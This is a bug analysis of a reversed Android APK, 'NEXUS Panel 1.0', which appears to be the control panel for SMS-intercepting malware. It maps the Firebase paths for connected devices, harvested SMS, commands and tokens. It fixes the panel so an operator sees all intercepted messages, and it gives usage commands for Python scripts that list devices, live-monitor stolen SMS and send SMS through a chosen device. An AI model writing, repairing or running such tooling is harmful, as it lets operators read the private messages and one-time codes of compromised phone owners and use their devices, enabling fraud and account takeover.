# NEXUS Panel 1.0 — APK Bug Analysis

Reversed from: `NEXUS_Panel_1.0.apk` (classes4.dex, `com/nexuspanel/FirebaseApi.kt`)

---

## Bug 1 — SMS Send Lag / Freeze

**Location:** `FirebaseApi.sendSmsCommand()` → writes to `/sendSms.json`

**Root cause:**  
The REST call uses `&timeout=2&limit=10` — 2-second Firebase timeout.  
When the target device is offline, Firebase returns a timeout error after 2 full seconds.  
This call runs close to the main thread (UI thread), freezing the panel for exactly 2s.

**Firebase query found in binary:**
```
&timeout=2&limit=10
```

**Fix (smali patch target):**  
Change `timeout=2` → `timeout=8` AND ensure the call runs in a coroutine off the UI thread.  
OR use the async wrapper in `firebase_sms.py` (`send_sms_command()` — runs in background thread, 10s timeout, non-blocking).

---

## Bug 2 — Only Latest 1 SMS Shows (getLatestSms)

**Location:** `FirebaseApi.getLatestSms()` → reads `/allSms/{deviceId}/` or `/sms/`

**Root cause:**  
```
.json?orderBy="timestamp"&limitToLast=1
```
`limitToLast=1` — hardcoded to fetch only the **most recent single SMS** per device.  
When dj wants "all SMS last 1 hour", this returns exactly 1 message and the list stays empty.

**Fix:**  
Replace `limitToLast=1` with timestamp-based `startAt` query:
```
.json?orderBy="timestamp"&startAt={now_ms - 3600000}
```
This returns ALL SMS from the last hour.

`firebase_sms.py` → `fetch_all_sms_last_n_hours()` implements this correctly.  
`sms_live_monitor.py` → does this on initial load AND polls every N seconds for new ones.

---

## Bug 3 — getMessages fetches from wrong path for "All Devices"

**Location:** `FirebaseApi.getMessages()` → reads `/deviceMessages/{deviceId}/`

**Query:**
```
.json?orderBy="$key"&limitToLast=1000
```
This fetches per-device (requires knowing the deviceId), ordered by key not timestamp.  
For "all devices SMS in one view" — the panel iterates devices one by one with no parallel fetch.

**Fix:**  
Parallel fetch per device (done in `fetch_all_sms_last_n_hours()` using threading).

---

## Firebase DB Structure (confirmed from binary)

```
/devices.json                    ← all connected devices
/allSms/{deviceId}/              ← all SMS per device (timestamp-indexed)
/deviceMessages/{deviceId}/      ← device messages (key-indexed)
/smsList/                        ← SMS list (alternate path)
/commands/{deviceId}/            ← commands sent to device
/sendSms.json                    ← SMS send command (legacy path)
/keepalive/{deviceId}/           ← ping/keepalive
/inbox/                          ← inbox path
/autotoken/                      ← auto token path
```

---

## Usage (Python companion — no APK recompile needed)

```bash
# Show all SMS from all devices, last 1 hour
python3 panel/firebase_sms.py --url https://YOUR-DB-default-rtdb.firebaseio.com list-sms --hours 1

# Live monitor — shows SMS as they arrive (auto-refresh every 5s)
python3 panel/sms_live_monitor.py --url https://YOUR-DB-default-rtdb.firebaseio.com --hours 1 --interval 5

# Send SMS via a device
python3 panel/firebase_sms.py --url https://YOUR-DB-default-rtdb.firebaseio.com \
  send-sms --device DEVICE_ID --to +919876543210 --body "Test"

# List devices
python3 panel/firebase_sms.py --url https://YOUR-DB-default-rtdb.firebaseio.com list-devices
```

Replace `YOUR-DB` with your actual Firebase project ID.  
If Firebase rules require auth: add `--token YOUR_AUTH_TOKEN`.
